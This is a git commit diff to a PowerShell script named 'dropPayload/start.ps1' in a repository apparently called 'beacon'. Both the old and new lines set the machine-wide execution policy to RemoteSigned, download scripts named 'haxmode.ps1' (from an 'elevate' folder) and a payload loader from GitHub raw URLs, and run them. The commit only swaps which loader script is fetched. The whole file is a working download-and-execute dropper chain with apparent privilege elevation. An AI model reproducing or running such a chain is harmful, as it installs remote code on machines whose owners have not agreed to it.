215274a30f174d1511af0750b50f1d3199b0106f
currone <94299594+snackmasta@users.noreply.github.com>
2024-01-31 23:10:30 +0700

    removePWD

--- dropPayload/start.ps1
+++ dropPayload/start.ps1
@@ -1,4 +1,1 @@
-Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine; 
-Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/haxmode.ps1 > $pwd/mode.ps1; 
-./mode.ps1;Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/dropPayload/InvokeAll.ps1 > $pwd/start.ps1; 
-./start.ps1
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine;  Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/haxmode.ps1 > $pwd/mode.ps1;  ./mode.ps1;Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/dropPayload/loadFile.ps1 > $pwd/start.ps1;  ./start.ps1
